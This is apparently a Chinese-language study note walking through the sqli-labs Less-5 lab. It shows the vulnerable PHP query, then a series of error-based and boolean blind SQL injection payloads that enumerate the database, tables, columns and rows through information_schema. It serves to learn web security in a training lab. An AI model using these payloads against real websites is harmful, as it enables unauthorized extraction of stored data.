# Less-5

## 0x00 注入

?id=1'

![image-20210112173848042](D:\WEB安全\笔记\image\image-20210112173848042.png)

?id=1' order by 4--+

![image-20210112173959557](D:\WEB安全\笔记\image\image-20210112173959557.png)

?id=1' order by 3--+

![image-20210112174016619](D:\WEB安全\笔记\image\image-20210112174016619.png)



```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

        if($row)
        {
        echo '<font size="5" color="#FFFF00">';
        echo 'You are in...........';
        echo "<br>";
        echo "</font>";
        }
        else
        {

        echo '<font size="3" color="#FFFF00">';
        print_r(mysql_error());
        echo "</br></font>";
        echo '<font color= "#0000ff" font size= 3>';

        }
```
不显示数据？？？？

盲注！！！！

将数据通过报错信息显示出来。报错型注入，并不是盲注。

原理：将group by与一个聚合函数一起使用，产生逻辑错误，可以将要查询的内容作为错误信息返回。

可用于产生错误的聚合函数有：



?id=-1' union select 1, count(*), concat(database() COLLATE utf8_general_ci, ':', rand(2), ':')   as a from information_schema.tables group by a--+

?id=-1' union select 1, count(*), concat(database() COLLATE utf8_general_ci, ':', floor(rand()x9), ':')   as a from information_schema.tables group by a--+

搞不了，一直报错

![image-20210113104600861](D:\WEB安全\笔记\image\image-20210113104600861.png)



这里换成布尔盲注

原理：利用booler值和二分法进行猜测

先猜database()的长度和内容。

?id=1' and length(database())>10--+

![image-20210113105252672](D:\WEB安全\笔记\image\image-20210113105252672.png)

?id=1' and left(database(), 1)>a--+

这里我直接用bp暴力跑。

id=1%27%20and%20substr(database(),%208,%201)=%27y%27--+

substr(s, pos, len)

使用Cluster bomb，第一位为数字1-8，第二位为字母a-z和各种mysql允许的字符。

mysql允许的字符：



只用小写字母即可，mysql不区分大小写。

爆表的数量

?id=1' and (select count(*) from information_schema.tables where table_schema=database() )=10--+

爆表名长度

?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0, 1))=10--+

爆表名

?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0, 1), 1, 1))=97--+

?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0, 1), 1, 1)='e'--+

爆字段数量

?id=1' and  (select count(column_name) from information_schema.columns where table_schema=database() and table_name='emails')=10--+

爆字段长度

?id=1' and length((select column_name from information_schema.columns where table_schema=database()  and table_name='emails' limit 0, 1))=8--+

爆字段名

?id=1' and substr((select column_name from information_schema.columns where table_schema=database()  and table_name='emails' limit 0, 1), 1, 1)='e'--+



爆数据数量

?id=1' and (select count(*) from emails)=8--+

爆数据长度

?id=1' and length((select email_id from emails limit 0, 1))=10--+

爆数据

?id=1' and substr((select email_id from emails limit 0, 1), 1, 1)='e'--+



limit 0, 1 返回一条数据，数据集第一条

limit 1, 1 返回一条数据，数据集第二条

建议使用ascii()，因为mysql不区分大小写，需要利用ascii()来判断字符的大小写

## 0x01 总结